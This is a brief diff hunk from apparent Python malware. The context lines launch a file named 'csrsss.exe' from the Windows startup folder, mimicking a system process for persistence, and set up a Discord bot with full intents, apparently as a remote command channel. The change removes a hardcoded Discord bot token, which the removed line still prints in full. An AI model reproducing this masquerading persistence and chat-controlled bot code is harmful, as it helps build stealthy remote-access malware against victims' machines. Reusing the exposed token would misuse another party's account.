@@ -65,7 +65,7 @@ else:
                 os.chdir(startup_path)
                 os.startfile(os.path.join(startup_path, 'csrsss.exe'))
         else:
-            TOKEN = 'MTEyMTQ0ODUzODgzNzExMDc5NA.GViiwq.208GAfzuWAHCV0Mr9PtB6-fNgzwe-TY-3KVhg8'
+            TOKEN = ''
 
             master = commands.Bot(command_prefix='_', intents=discord.Intents.all())
             master.remove_command('help')
